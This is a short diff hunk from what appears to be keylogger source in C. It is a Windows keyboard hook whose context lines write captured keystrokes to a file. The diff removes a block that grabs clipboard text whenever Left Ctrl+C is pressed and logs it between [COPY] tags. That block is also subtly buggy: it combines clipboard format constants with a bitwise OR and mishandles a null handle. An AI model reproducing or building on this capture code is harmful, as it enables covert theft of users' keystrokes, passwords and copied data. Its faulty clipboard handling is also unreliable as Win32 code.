@@ -133,20 +133,6 @@ LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam)
 					if (bytesWritten > 0)
 						WriteToFile(utf8Buffer);
 				}
-                if (GetAsyncKeyState(VK_LCONTROL) && kCode == 'C') // c moche
-                {
-                    DBG("LCTRL + C");
-                    if (!OpenClipboard(NULL))
-                        return 1;
-                    // SetClipboardData(CF_TEXT, NULL);
-                    HANDLE clipB = GetClipboardData(CF_TEXT | CF_UNICODETEXT);
-                    if (!clipB)
-                        CloseClipboard();
-                    sprintf_s(inputLog, sizeof(inputLog), "[COPY]%s[/COPY]", (char*)GlobalLock(clipB));
-                    WriteToFile(inputLog);
-                    GlobalUnlock(clipB);
-                    CloseClipboard();
-                }
                 break ;
         }
     }
